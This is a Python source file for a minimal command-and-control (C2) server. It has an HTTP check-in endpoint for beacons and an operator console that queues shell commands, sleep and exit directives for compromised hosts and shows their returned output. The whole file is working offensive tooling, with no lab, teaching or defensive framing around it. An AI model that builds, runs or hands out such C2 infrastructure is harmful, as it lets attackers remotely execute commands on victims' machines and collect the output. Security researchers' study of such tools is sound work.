#!/usr/bin/env python3
"""
server.py — minimal C2 server + operator CLI
Python 3.8+

Usage:
    python server.py [--host 0.0.0.0] [--port 8080]

The HTTP server and the operator CLI share one process.
The CLI runs on stdin; the HTTP listener runs on a background thread.

Task types
----------
exec  <command>   Queue a shell command for the next beacon check-in.
sleep <seconds>   Tell the beacon to sleep for N seconds.
exit              Tell the beacon to terminate.
tasks             List pending tasks.
results           List received results.
beacons           List known beacons.
help / ?          Print this help.
quit / q          Shut the server down.
"""

import argparse
import base64
import http.server
import json
import logging
import queue
import readline  # noqa: F401 — improves CLI line editing on POSIX
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional

logging.basicConfig(
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)
log = logging.getLogger("c2")


# ── data types ───────────────────────────────────────────────────────────────

@dataclass
class Task:
    task_id: str
    task_type: str          # "exec" | "sleep" | "exit"
    data_b64: str           # base64-encoded payload (empty string for "exit")
    created_at: float = field(default_factory=time.time)
    assigned_to: Optional[str] = None   # host_id once dequeued


@dataclass
class TaskResult:
    task_id: str
    host_id: str
    stdout_b64: str
    stderr_b64: str
    exit_code: int
    received_at: float = field(default_factory=time.time)


@dataclass
class Beacon:
    host_id: str
    last_seen: float = field(default_factory=time.time)
    checkin_count: int = 0


# ── shared state (protected by a single lock) ────────────────────────────────

class State:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._task_queue: queue.Queue[Task] = queue.Queue()
        self._pending: Dict[str, Task] = {}       # task_id → Task (sent, awaiting result)
        self._results: List[TaskResult] = []
        self._beacons: Dict[str, Beacon] = {}

    # --- beacons ---

    def touch_beacon(self, host_id: str) -> None:
        with self._lock:
            if host_id in self._beacons:
                b = self._beacons[host_id]
                b.last_seen = time.time()
                b.checkin_count += 1
            else:
                self._beacons[host_id] = Beacon(host_id=host_id)

    def list_beacons(self) -> List[Beacon]:
        with self._lock:
            return list(self._beacons.values())

    # --- tasks ---

    def enqueue(self, task: Task) -> None:
        self._task_queue.put(task)
        log.info("Task queued  id=%s type=%s", task.task_id, task.task_type)

    def pop_task(self, host_id: str) -> Optional[Task]:
        """Dequeue one task; mark it as assigned to host_id."""
        try:
            task = self._task_queue.get_nowait()
        except queue.Empty:
            return None
        task.assigned_to = host_id
        with self._lock:
            self._pending[task.task_id] = task
        log.info("Task dispatched  id=%s  host=%s", task.task_id, host_id)
        return task

    def pending_count(self) -> int:
        return self._task_queue.qsize()

    def list_pending(self) -> List[Task]:
        """Non-destructive snapshot of the queue (approximate)."""
        with self._lock:
            items = list(self._task_queue.queue)
        return items

    # --- results ---

    def record_result(self, result: TaskResult) -> None:
        with self._lock:
            self._pending.pop(result.task_id, None)
            self._results.append(result)
        log.info(
            "Result received  task=%s  host=%s  exit=%d",
            result.task_id, result.host_id, result.exit_code,
        )

    def list_results(self) -> List[TaskResult]:
        with self._lock:
            return list(self._results)


# ── HTTP handler ─────────────────────────────────────────────────────────────

def _b64_safe(data_b64: str) -> str:
    """Escape the base64 string so it is safe inside a JSON string literal."""
    return data_b64.replace("\\", "\\\\").replace('"', '\\"')


class C2Handler(http.server.BaseHTTPRequestHandler):
    state: State  # injected by the factory below

    # silence the default access log — we use our own
    def log_message(self, fmt, *args):  # noqa: N802
        pass

    def _send_json(self, code: int, obj: dict) -> None:
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json_body(self) -> Optional[dict]:
        length = int(self.headers.get("Content-Length", 0))
        if length <= 0:
            return None
        raw = self.rfile.read(length)
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return None

    def do_POST(self):  # noqa: N802
        if self.path != "/checkin":
            self._send_json(404, {"error": "not found"})
            return

        body = self._read_json_body()
        if not body or "host_id" not in body:
            self._send_json(400, {"error": "bad request"})
            return

        host_id: str = str(body["host_id"])[:128]

        # record beacon
        self.state.touch_beacon(host_id)

        # accept result if present
        task_id = body.get("task_id", "")
        if task_id:
            stdout_b64 = body.get("stdout", "")
            stderr_b64 = body.get("stderr", "")
            try:
                exit_code = int(body.get("exit_code", -1))
            except (TypeError, ValueError):
                exit_code = -1

            result = TaskResult(
                task_id=task_id,
                host_id=host_id,
                stdout_b64=stdout_b64,
                stderr_b64=stderr_b64,
                exit_code=exit_code,
            )
            self.state.record_result(result)

        # dispatch next task (if any)
        task = self.state.pop_task(host_id)
        if task is None:
            self._send_json(200, {"type": "none"})
            return

        self._send_json(200, {
            "task_id": task.task_id,
            "type":    task.task_type,
            "data":    task.data_b64,
        })


def make_handler(state: State):
    """Return a C2Handler subclass with state injected."""
    class BoundHandler(C2Handler):
        pass
    BoundHandler.state = state
    return BoundHandler


# ── operator CLI ──────────────────────────────────────────────────────────────

def _fmt_time(ts: float) -> str:
    return time.strftime("%H:%M:%S", time.localtime(ts))


def _decode_b64(b64: str) -> str:
    if not b64:
        return ""
    try:
        return base64.b64decode(b64).decode(errors="replace")
    except Exception:
        return f"<decode error: {b64!r}>"


HELP_TEXT = """\
Commands:
  exec  <command>    queue a shell command
  sleep <seconds>    queue a sleep directive
  exit               queue an exit directive
  tasks              list queued (pending) tasks
  results            list received results
  beacons            list known beacons
  help / ?           show this help
  quit / q           shut down
"""


def run_cli(state: State, stop_event: threading.Event) -> None:
    print(HELP_TEXT)
    while not stop_event.is_set():
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            stop_event.set()
            break

        if not line:
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd in ("quit", "q"):
            stop_event.set()
            break

        elif cmd in ("help", "?"):
            print(HELP_TEXT)

        elif cmd == "exec":
            if not arg:
                print("Usage: exec <shell command>")
                continue
            data_b64 = base64.b64encode(arg.encode()).decode()
            task = Task(
                task_id=str(uuid.uuid4()),
                task_type="exec",
                data_b64=data_b64,
            )
            state.enqueue(task)
            print(f"  Queued exec task {task.task_id}")

        elif cmd == "sleep":
            if not arg:
                print("Usage: sleep <seconds>")
                continue
            try:
                secs = int(arg)
            except ValueError:
                print("  Error: seconds must be an integer")
                continue
            data_b64 = base64.b64encode(str(secs).encode()).decode()
            task = Task(
                task_id=str(uuid.uuid4()),
                task_type="sleep",
                data_b64=data_b64,
            )
            state.enqueue(task)
            print(f"  Queued sleep task {task.task_id} ({secs}s)")

        elif cmd == "exit":
            task = Task(
                task_id=str(uuid.uuid4()),
                task_type="exit",
                data_b64="",
            )
            state.enqueue(task)
            print(f"  Queued exit task {task.task_id}")

        elif cmd == "tasks":
            items = state.list_pending()
            if not items:
                print("  No pending tasks.")
            else:
                print(f"  {'ID':<38}  {'TYPE':<8}  CREATED")
                for t in items:
                    print(f"  {t.task_id:<38}  {t.task_type:<8}  {_fmt_time(t.created_at)}")

        elif cmd == "results":
            items = state.list_results()
            if not items:
                print("  No results yet.")
            else:
                for r in items:
                    print(f"\n  ── task {r.task_id}  host={r.host_id}"
                          f"  exit={r.exit_code}  at={_fmt_time(r.received_at)}")
                    stdout = _decode_b64(r.stdout_b64)
                    stderr = _decode_b64(r.stderr_b64)
                    if stdout:
                        print("  STDOUT:")
                        for ln in stdout.splitlines():
                            print(f"    {ln}")
                    if stderr:
                        print("  STDERR:")
                        for ln in stderr.splitlines():
                            print(f"    {ln}")
                    if not stdout and not stderr:
                        print("  (no output)")

        elif cmd == "beacons":
            items = state.list_beacons()
            if not items:
                print("  No beacons seen yet.")
            else:
                print(f"  {'HOST ID':<40}  {'LAST SEEN':<10}  CHECK-INS")
                for b in items:
                    print(f"  {b.host_id:<40}  {_fmt_time(b.last_seen):<10}  {b.checkin_count}")

        else:
            print(f"  Unknown command: {cmd!r}. Type 'help' for usage.")


# ── entry point ───────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="Minimal C2 server")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Bind address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Listen port (default: 8080)")
    args = parser.parse_args()

    state = State()
    handler_class = make_handler(state)

    httpd = http.server.HTTPServer((args.host, args.port), handler_class)
    httpd.timeout = 1  # allow periodic stop-event checks

    stop_event = threading.Event()

    def serve_loop():
        log.info("HTTP listener up on %s:%d", args.host, args.port)
        while not stop_event.is_set():
            httpd.handle_request()
        httpd.server_close()
        log.info("HTTP listener stopped.")

    server_thread = threading.Thread(target=serve_loop, daemon=True, name="http")
    server_thread.start()

    try:
        run_cli(state, stop_event)
    finally:
        stop_event.set()
        server_thread.join(timeout=3)
        log.info("Goodbye.")


if __name__ == "__main__":
    main()
